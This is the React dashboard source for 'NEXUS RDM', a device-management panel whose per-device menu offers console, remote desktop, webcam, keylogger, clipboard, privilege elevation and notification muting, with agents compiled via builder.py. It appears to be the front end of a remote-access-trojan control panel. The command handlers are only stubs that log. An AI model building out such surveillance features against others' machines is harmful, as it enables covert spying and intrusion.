import { useEffect, useState, useCallback, useRef } from "react";
import { createPortal } from "react-dom";
import { useNavigate } from "react-router-dom";
import { useAuthStore } from "../store/auth";
import api from "../utils/api";
import s from "./Dashboard.module.css";

// ─── Constants ────────────────────────────────────────────────────────────────
const CATEGORIES = {
  "Remote Access": {
    icon: "⚡",
    items: [
      { label: "Console",        icon: "⌨",  danger: false },
      { label: "Remote Desktop", icon: "🖥",  danger: false },
      { label: "Backstage",      icon: "🎭",  danger: false },
      { label: "Voice",          icon: "🎙",  danger: false },
    ],
  },
  "Monitoring": {
    icon: "👁",
    items: [
      { label: "Webcam",          icon: "📷", danger: false },
      { label: "Keylogger",       icon: "⌨",  danger: false },
      { label: "Process Manager", icon: "📊", danger: false },
    ],
  },
  "System": {
    icon: "⚙",
    items: [
      { label: "File Manager",    icon: "📁", danger: false },
      { label: "Registry Editor", icon: "🔧", danger: false },
      { label: "Task Killer",     icon: "💀", danger: false },
      { label: "Clipboard",       icon: "📋", danger: false },
    ],
  },
  "Agent": {
    icon: "🤖",
    items: [
      { label: "Ping",               icon: "📡", danger: false },
      { label: "Reconnect",          icon: "🔄", danger: false },
      { label: "Set Nickname",       icon: "✏",  danger: false },
      { label: "Set Custom Tag",     icon: "🏷",  danger: false },
      { label: "Set Group",          icon: "👥", danger: false },
      { label: "Mute Notifications", icon: "🔕", danger: false },
      { label: "Elevate",            icon: "⬆",  danger: false },
      { label: "Disconnect",         icon: "🔌", danger: true  },
      { label: "Uninstall",          icon: "🗑",  danger: true  },
    ],
  },
};

// ─── Dashboard ────────────────────────────────────────────────────────────────
export default function Dashboard() {
  const navigate = useNavigate();
  const { user, logout, refreshToken } = useAuthStore();
  const [devices,  setDevices]  = useState([]);
  const [stats,    setStats]    = useState(null);
  const [loading,  setLoading]  = useState(true);
  const [showAdd,  setShowAdd]  = useState(false);
  const [newKey,   setNewKey]   = useState(null);
  const [filter,   setFilter]   = useState("all");
  const [search,   setSearch]   = useState("");

  const load = useCallback(async () => {
    try {
      const [sr, dr] = await Promise.all([
        api.get("/api/devices/stats"),
        api.get("/api/devices"),
      ]);
      setStats(sr.data);
      setDevices(dr.data.devices);
    } catch (e) { console.error(e); }
    finally { setLoading(false); }
  }, []);

  const refreshDevice = useCallback(async (id) => {
    try {
      const { data } = await api.get(`/api/devices/${id}`);
      setDevices(prev => prev.map(d => d.id === id ? data.device : d));
      // also refresh stats
      const { data: s } = await api.get("/api/devices/stats");
      setStats(s);
    } catch (e) { console.error(e); }
  }, []);

  useEffect(() => { load(); }, [load]);
  useEffect(() => {
    const t = setInterval(load, 30_000);
    return () => clearInterval(t);
  }, [load]);

  const handleLogout = async () => {
    try { await api.post("/api/auth/logout", { refreshToken }); } catch {}
    logout(); navigate("/login");
  };

  const handleDelete = async (id) => {
    if (!confirm("Delete this device? This cannot be undone.")) return;
    await api.delete(`/api/devices/${id}`);
    load();
  };

  const filtered = devices.filter(d => {
    const matchStatus = filter === "all" || d.status === filter;
    const q = search.toLowerCase();
    const matchSearch = !q ||
      d.name?.toLowerCase().includes(q) ||
      d.hostname?.toLowerCase().includes(q) ||
      d.ip_address?.includes(q) ||
      d.username?.toLowerCase().includes(q);
    return matchStatus && matchSearch;
  });

  if (loading) return <Loader />;

  return (
    <div className={s.layout}>
      {/* ── Sidebar ── */}
      <aside className={s.sidebar}>
        <div className={s.sidebarTop}>
          <div className={s.brand}>
            <span className={s.brandMark}>N</span>
            <div className={s.brandName}>NEXUS<span style={{ color: "var(--accent)" }}>RDM</span></div>
          </div>
          <nav className={s.nav}>
            <NavItem icon="⬡" label="DEVICES"   active />
            <NavItem icon="◈" label="TERMINAL" />
            <NavItem icon="◎" label="AUDIT LOG" />
            <NavItem icon="◇" label="SETTINGS" />
          </nav>
        </div>
        <div className={s.sidebarBottom}>
          <div className={s.userRow}>
            <div className={s.avatar}>{(user?.name?.[0] ?? "U").toUpperCase()}</div>
            <div className={s.userInfo}>
              <div className={s.userName}>{user?.name}</div>
              <div className={s.userRole}>{user?.role?.toUpperCase()}</div>
            </div>
          </div>
          <button className={s.logoutBtn} onClick={handleLogout} title="Sign out">⏻</button>
        </div>
      </aside>

      {/* ── Main ── */}
      <main className={s.main}>
        <div className={s.header}>
          <div>
            <h1 className={s.pageTitle}>DEVICES</h1>
            <div className={s.pageSub}>// {devices.length} registered · auto-refresh 30s</div>
          </div>
          <button className="btn-primary" onClick={() => setShowAdd(true)}>+ REGISTER</button>
        </div>

        {/* Stats */}
        {stats && (
          <div className={s.statsRow}>
            {[
              { label: "TOTAL",   value: stats.total,   color: "accent", key: "all"     },
              { label: "ONLINE",  value: stats.online,  color: "online", key: "online"  },
              { label: "OFFLINE", value: stats.offline, color: "dim",    key: "offline" },
              { label: "WARNING", value: stats.warning, color: "warn",   key: "warning" },
            ].map(({ label, value, color, key }) => (
              <div
                key={key}
                className={`${s.stat} ${filter === key ? s.statActive : ""}`}
                onClick={() => setFilter(key)}
              >
                <div className={s.statVal} style={{ color: statColor(color) }}>{value ?? 0}</div>
                <div className={s.statLabel}>{label}</div>
              </div>
            ))}
          </div>
        )}

        {/* Search */}
        <input
          className={s.search}
          placeholder="Search name, hostname, IP, user…"
          value={search}
          onChange={e => setSearch(e.target.value)}
        />

        {/* API key banner */}
        {newKey && (
          <div className={s.keyBanner}>
            <div className={s.keyBannerTitle}>⚠ DEVICE KEY — COPY NOW. NEVER SHOWN AGAIN.</div>
            <div className={s.keyValue}>{newKey}</div>
            <div className={s.keyActions}>
              <button className={s.keyCopy} onClick={() => navigator.clipboard?.writeText(newKey)}>
                COPY
              </button>
              <button className={s.keyClose} onClick={() => setNewKey(null)}>DISMISS</button>
            </div>
          </div>
        )}

        {/* Device grid */}
        {filtered.length === 0 ? (
          <EmptyState onAdd={() => setShowAdd(true)} hasFilter={filter !== "all" || !!search} />
        ) : (
          <div className={s.deviceGrid}>
            {filtered.map(d => (
              <DeviceCard
                key={d.id}
                device={d}
                onDelete={() => handleDelete(d.id)}
                onRefresh={() => refreshDevice(d.id)}
              />
            ))}
          </div>
        )}
      </main>

      {showAdd && (
        <AddDeviceModal
          onClose={() => setShowAdd(false)}
          onCreated={key => { setNewKey(key); setShowAdd(false); load(); }}
        />
      )}
    </div>
  );
}

// ─── Device Card ──────────────────────────────────────────────────────────────
function DeviceCard({ device: d, onDelete, onRefresh }) {
  const [menuOpen,    setMenuOpen]    = useState(false);
  const [activecat,   setActiveCat]   = useState(null);
  const [refreshing,  setRefreshing]  = useState(false);
  const [menuPos,     setMenuPos]     = useState({ top: 0, left: 0 });
  const btnRef   = useRef(null);
  const menuRef  = useRef(null);

  const statusColor = {
    online:  "var(--online)",
    offline: "var(--offline)",
    warning: "var(--warning)",
  }[d.status] ?? "var(--offline)";

  const ramPct  = d.ram_total  ? Math.round((d.ram_used  / d.ram_total)  * 100) : null;
  const diskPct = d.disk_total ? Math.round((d.disk_used / d.disk_total) * 100) : null;
  const age     = d.last_seen  ? timeAgo(new Date(d.last_seen)) : "never";

  // Close menu on outside click
  useEffect(() => {
    if (!menuOpen) return;
    const handler = e => {
      if (menuRef.current && !menuRef.current.contains(e.target) &&
          btnRef.current  && !btnRef.current.contains(e.target)) {
        setMenuOpen(false);
        setActiveCat(null);
      }
    };
    document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, [menuOpen]);

  const openMenu = () => {
    if (menuOpen) { setMenuOpen(false); setActiveCat(null); return; }
    const rect = btnRef.current.getBoundingClientRect();
    setMenuPos({
      top:  rect.top - 8,      // above the button
      left: rect.left,
    });
    setMenuOpen(true);
    setActiveCat(null);
  };

  const handleRefresh = async () => {
    setRefreshing(true);
    await onRefresh();
    setRefreshing(false);
  };

  const handleItem = (cat, item) => {
    if (item.danger) {
      if (!confirm(`${item.label} on ${d.hostname || d.name}?`)) return;
    }
    console.log(`[cmd] ${cat} › ${item.label} on device ${d.id}`);
    setMenuOpen(false);
    setActiveCat(null);
  };

  return (
    <div className={s.card}>
      {/* Status row */}
      <div className={s.cardTop}>
        <span className={s.statusDot} style={{
          background: statusColor,
          boxShadow: d.status === "online" ? `0 0 7px ${statusColor}` : "none",
        }} />
        <span className={s.cardStatus} style={{ color: statusColor }}>
          {d.status === "online" ? "Online" : d.status === "warning" ? "Warning" : "Offline"}
        </span>
        <span className={s.cardAge}>· {age}</span>
        {d.ping_ms != null && d.status === "online" && (
          <span className={s.ping}>⟳ {d.ping_ms} ms</span>
        )}
      </div>

      {/* Name */}
      <div className={s.cardName}>
        <span className={s.cardNameIcon}>≡</span>
        {d.hostname || d.name}
      </div>

      {/* User + IP */}
      {d.username && (
        <div className={s.cardMeta}>
          <span className={s.metaIco}>👤</span>{d.username}
        </div>
      )}
      {d.ip_address && (
        <div className={s.cardMeta}>
          <span className={s.metaIco}>🌐</span>{d.ip_address}
        </div>
      )}

      {/* Badges: OS / arch / cores / version */}
      <div className={s.cardBadges}>
        {d.os && (
          <span className={s.badge}>
            🪟 {d.os}{d.os_version ? ` ${d.os_version}` : ""}
          </span>
        )}
        {d.arch     && <span className={s.badge}>{d.arch}</span>}
        {d.cpu_cores && <span className={s.badge}>🖥 {d.cpu_cores}</span>}
        {d.agent_version && (
          <span className={`${s.badge} ${s.badgeGreen}`}>v{d.agent_version}</span>
        )}
      </div>

      {/* CPU model */}
      {d.cpu_model && <div className={s.cpuModel}>{d.cpu_model}</div>}

      {/* Metric bars */}
      <div className={s.metrics}>
        {d.ram_total != null && (
          <MetricBar
            label={formatBytes(d.ram_total)}
            pct={ramPct}
            color={ramPct > 85 ? "var(--danger)" : "var(--accent)"}
          />
        )}
        {d.disk_total != null && (
          <MetricBar
            label="DISK"
            pct={diskPct}
            color={diskPct > 90 ? "var(--danger)" : "var(--warning)"}
          />
        )}
        {d.battery_percent != null && (
          <MetricBar
            label="BAT"
            pct={d.battery_percent}
            color={d.battery_charging
              ? "var(--online)"
              : d.battery_percent < 20
                ? "var(--danger)"
                : "var(--warning)"}
            suffix={d.battery_charging ? " ⚡" : ""}
          />
        )}
      </div>

      {/* Footer */}
      <div className={s.cardFooter}>
        <button ref={btnRef} className={s.cmdBtn} onClick={openMenu}>
          <span className={s.cmdBtnIcon}>&gt;_</span> Commands
        </button>
        <button
          className={s.iconBtn}
          onClick={handleRefresh}
          title="Refresh"
          style={{ opacity: refreshing ? 0.5 : 1 }}
        >
          <span style={{ display: "inline-block", animation: refreshing ? "spin 0.6s linear infinite" : "none" }}>
            ↺
          </span>
        </button>
        <button className={s.iconBtnDanger} onClick={onDelete} title="Delete">⊗</button>
      </div>

      {/* Dropdown — rendered into body via portal to avoid overflow clipping */}
      {menuOpen && createPortal(
        <div
          ref={menuRef}
          className={s.portalMenu}
          style={{ top: menuPos.top, left: menuPos.left }}
        >
          {/* Category list */}
          <div className={s.dropPanel}>
            {Object.entries(CATEGORIES).map(([cat, { icon }]) => (
              <div
                key={cat}
                className={`${s.dropItem} ${activecat === cat ? s.dropItemActive : ""}`}
                onMouseEnter={() => setActiveCat(cat)}
              >
                <span className={s.dropIcon}>{icon}</span>
                {cat}
                <span className={s.dropArrow}>›</span>
              </div>
            ))}
          </div>

          {/* Sub-items */}
          {activecat && (
            <div className={s.dropPanel}>
              {CATEGORIES[activecat].items.map(item => (
                <div
                  key={item.label}
                  className={`${s.dropItem} ${item.danger ? s.dropItemDanger : ""}`}
                  onClick={() => handleItem(activecat, item)}
                >
                  <span className={s.dropIcon}>{item.icon}</span>
                  {item.label}
                </div>
              ))}
            </div>
          )}
        </div>,
        document.body
      )}
    </div>
  );
}

// ─── Metric Bar ───────────────────────────────────────────────────────────────
function MetricBar({ label, pct, color, suffix = "" }) {
  return (
    <div className={s.metricRow}>
      <span className={s.metricLabel}>{label}</span>
      <div className={s.barTrack}>
        <div className={s.barFill} style={{ width: `${Math.min(pct ?? 0, 100)}%`, background: color }} />
      </div>
      <span className={s.metricPct}>{pct != null ? `${pct}%${suffix}` : "—"}</span>
    </div>
  );
}

// ─── Add Device Modal ─────────────────────────────────────────────────────────
function AddDeviceModal({ onClose, onCreated }) {
  const [name,     setName]     = useState("");
  const [tags,     setTags]     = useState("");
  const [interval, setInterval] = useState("30");
  const [error,    setError]    = useState("");
  const [loading,  setLoading]  = useState(false);

  const submit = async () => {
    if (!name.trim()) return setError("Device name required");
    const iv = parseInt(interval, 10);
    if (isNaN(iv) || iv < 10 || iv > 300) return setError("Interval must be 10–300 seconds");
    setLoading(true); setError("");
    try {
      const { data } = await api.post("/api/devices", {
        name: name.trim(),
        tags: tags.split(",").map(t => t.trim()).filter(Boolean),
        heartbeat_interval: iv,
      });
      onCreated(data.apiKey);
    } catch (e) {
      setError(e.response?.data?.error ?? "Failed to create device");
    } finally { setLoading(false); }
  };

  return (
    <div className={s.overlay} onClick={onClose}>
      <div className={s.modal} onClick={e => e.stopPropagation()}>
        <div className={s.modalHeader}>
          <span className={s.modalTitle}>// REGISTER DEVICE</span>
          <button className={s.modalClose} onClick={onClose}>✕</button>
        </div>
        <div className={s.modalBody}>
          <ModalField label="DEVICE NAME"              value={name}     onChange={setName}     placeholder="office-pc-01" />
          <ModalField label="TAGS (comma separated)"   value={tags}     onChange={setTags}     placeholder="windows, production" />
          <div>
            <label className={s.modalLabel}>HEARTBEAT INTERVAL (10–300 seconds)</label>
            <input type="number" min={10} max={300} value={interval}
              onChange={e => setInterval(e.target.value)} />
          </div>
          {error && <div className={s.modalError}>{error}</div>}
          <div className={s.modalNote}>
            The API key is shown once after creation. Use it in builder.py to compile the agent.
          </div>
        </div>
        <div className={s.modalFooter}>
          <button className="btn-ghost" onClick={onClose}>CANCEL</button>
          <button className="btn-primary" onClick={submit} disabled={loading}>
            {loading ? "CREATING…" : "CREATE →"}
          </button>
        </div>
      </div>
    </div>
  );
}

// ─── Small components ─────────────────────────────────────────────────────────
function NavItem({ icon, label, active }) {
  return (
    <div className={`${s.navItem} ${active ? s.navActive : ""}`}>
      <span className={s.navIcon}>{icon}</span>
      <span>{label}</span>
    </div>
  );
}

function ModalField({ label, value, onChange, placeholder }) {
  return (
    <div>
      <label className={s.modalLabel}>{label}</label>
      <input type="text" value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} />
    </div>
  );
}

function EmptyState({ onAdd, hasFilter }) {
  return (
    <div className={s.empty}>
      <div className={s.emptyGlyph}>⬡</div>
      <div className={s.emptyTitle}>{hasFilter ? "NO MATCHES" : "NO DEVICES YET"}</div>
      <div className={s.emptySub}>
        {hasFilter ? "Try a different filter or search term" : "Register a device to get an API key, then run builder.py"}
      </div>
      {!hasFilter && (
        <button className="btn-primary" style={{ marginTop: "1.25rem", width: "auto" }} onClick={onAdd}>
          + REGISTER FIRST DEVICE
        </button>
      )}
    </div>
  );
}

function Loader() {
  return (
    <div style={{ height: "100vh", display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 16 }}>
      <div style={{ width: 32, height: 32, border: "2px solid var(--border-hi)", borderTopColor: "var(--accent)", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />
      <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      <span style={{ fontFamily: "var(--font-mono)", fontSize: 12, color: "var(--text-3)", letterSpacing: "0.1em" }}>LOADING…</span>
    </div>
  );
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
function statColor(c) {
  return { accent: "var(--accent)", online: "var(--online)", dim: "var(--text-3)", warn: "var(--warning)" }[c];
}

function formatBytes(bytes) {
  if (!bytes) return "—";
  const gb = bytes / 1024 / 1024 / 1024;
  return gb >= 1 ? `${gb.toFixed(0)} GB` : `${(bytes / 1024 / 1024).toFixed(0)} MB`;
}

function timeAgo(date) {
  const sec = Math.floor((Date.now() - date) / 1000);
  if (sec <    60) return `${sec}s ago`;
  if (sec <  3600) return `${Math.floor(sec / 60)}m ago`;
  if (sec < 86400) return `${Math.floor(sec / 3600)}h ago`;
  return `${Math.floor(sec / 86400)}d ago`;
}
